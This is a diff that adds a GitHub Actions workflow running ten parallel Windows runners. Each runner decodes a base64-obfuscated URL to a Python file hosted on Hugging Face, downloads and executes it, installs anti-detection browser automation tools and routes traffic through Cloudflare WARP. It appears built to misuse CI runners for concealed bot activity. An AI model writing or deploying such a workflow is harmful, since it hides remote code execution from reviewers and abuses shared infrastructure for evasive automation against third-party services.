@@ -1,0 +1,70 @@
+name: Cloud Execution Grid
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: grid-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  spin-up-instances:
+    name: "Instance-${{ matrix.instance_number }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        instance_number: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Environment Provisioning & Payload Retrieval
+        shell: bash
+        run: |
+          echo "[LAUNCH] Booting instance #${{ matrix.instance_number }}..."
+          
+          # جلب النص البرمجي من المستودع الخارجي
+          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$PAYLOAD_URL" -o app_task.py
+          
+          echo "[LAUNCH] Installing supporting packages..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[LAUNCH] All systems ready."
+
+      - name: Operational Engine & Timeout Governor
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Firing up engine on node ${{ matrix.instance_number }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $TaskConfiguration = @{
+              FilePath     = "python"
+              ArgumentList = "app_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $WorkerJob = Start-Process @TaskConfiguration
+          
+          Write-Output ">>> Monitor engaged. Maximum execution window: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $WorkerJob -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Process wrapped up within allowed timeframe."
+          }
+          catch {
+              Write-Output ">>> Time quota exhausted! Aborting operation..."
+              Stop-Process -InputObject $WorkerJob -Force
+              Write-Output ">>> Operation aborted successfully."
+          }
+
+      - name: Final Status Report
+        shell: bash
+        run: echo "[FINISH] Instance ${{ matrix.instance_number }} has finished its cycle."
